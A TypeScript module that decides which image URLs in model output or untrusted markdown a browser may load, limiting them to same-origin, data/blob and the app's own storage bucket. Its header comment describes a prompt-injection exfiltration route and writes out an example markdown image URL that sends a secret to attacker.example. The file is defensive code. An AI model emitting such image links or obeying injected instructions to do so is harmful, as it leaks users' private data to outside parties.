/**
 * Decides whether an image URL that comes from model output (or any other untrusted
 * markdown) may be loaded by the browser.
 *
 * Loading a remote image sends a request the moment the message is displayed. A prompt
 * injection can use that to leak data: `![](https://attacker.example/?d=<secret>)`.
 * So only images we host, or that never leave the browser, are loaded.
 */

const STORAGE_HOSTS = new Set(["storage.googleapis.com", "firebasestorage.googleapis.com"]);

const getStorageBucket = (): string =>
  (process.env.REACT_APP_FIREBASE_STORAGE_BUCKET || "").trim().replace(/^gs:\/\//, "");

/**
 * When the bucket is known, a storage URL must point inside it. Anyone can create a
 * public bucket on storage.googleapis.com and read its access logs, so the host alone
 * is not enough.
 */
const isOurStorageUrl = (url: URL): boolean => {
  if (url.protocol !== "https:" || !STORAGE_HOSTS.has(url.hostname)) return false;

  const bucket = getStorageBucket();
  if (!bucket) return true;

  const path = decodeURIComponent(url.pathname);
  if (url.hostname === "storage.googleapis.com") {
    return path.startsWith(`/${bucket}/`);
  }
  // firebasestorage.googleapis.com/v0/b/<bucket>/o/<object>
  return path.startsWith(`/v0/b/${bucket}/`);
};

export const isAllowedImageUrl = (src: string | undefined | null): boolean => {
  if (!src) return false;
  const value = src.trim();
  if (!value) return false;

  const lower = value.toLowerCase();
  if (lower.startsWith("data:image/") || lower.startsWith("blob:")) return true;

  let url: URL;
  try {
    url = new URL(value, window.location.origin);
  } catch {
    return false;
  }

  if (url.origin === window.location.origin) return true;
  return isOurStorageUrl(url);
};

/** Only http(s) URLs are offered as a link when an image is not loaded. */
export const isHttpUrl = (src: string | undefined | null): boolean => {
  if (!src) return false;
  try {
    const url = new URL(src.trim());
    return url.protocol === "https:" || url.protocol === "http:";
  } catch {
    return false;
  }
};
